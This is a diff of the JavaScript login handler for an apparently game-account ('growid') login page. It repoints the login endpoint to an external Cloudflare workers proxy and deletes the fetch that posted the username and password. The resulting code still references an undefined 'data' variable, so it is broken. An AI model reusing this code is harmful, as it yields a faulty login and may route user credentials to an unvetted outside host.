@@ -552,7 +552,7 @@
         document.body.appendChild(div);
         return div;
     }
-    const API_URL = '/api/login';
+    const API_URL = 'https://cors-proxy.adtya-dyansyh.workers.dev';
     const form_login = document.getElementById('loginForm');
     if (form_login) {
         form_login.addEventListener('submit', async function(e) {
@@ -569,20 +569,6 @@
 
             
             if (isUsernameValid && isPasswordValid) {
-                try {
-                  const response = await fetch(API_URL, {
-                      method: 'POST',
-                      mode: 'no-cors', // Hanya untuk kasus khusus
-                      headers: {
-                          'Content-Type': 'application/json',
-                      },
-                      body: JSON.stringify({ growid: uName, password: uPass })
-                  });
-                const data = await response.json();
-                if (!response.ok) {
-                    showValidationError(document.getElementById('loginUsernameError'), data.message);
-                }
-                else {
                     setTimeout(() => {
                         console.log('User data:', data);
                     }, 1500);
@@ -595,12 +581,7 @@
                     loginButton.textContent = "Login";
                     loginButton.classList.remove("loading"); 
                     }, 2000);       
-                }
-                }
-                catch (error) {
-                  console.error("Fetch error:", error);
-                  showValidationError(document.getElementById('loginUsernameError'), "Failed to connect to server.");
-                }
+                
             }
         });
 
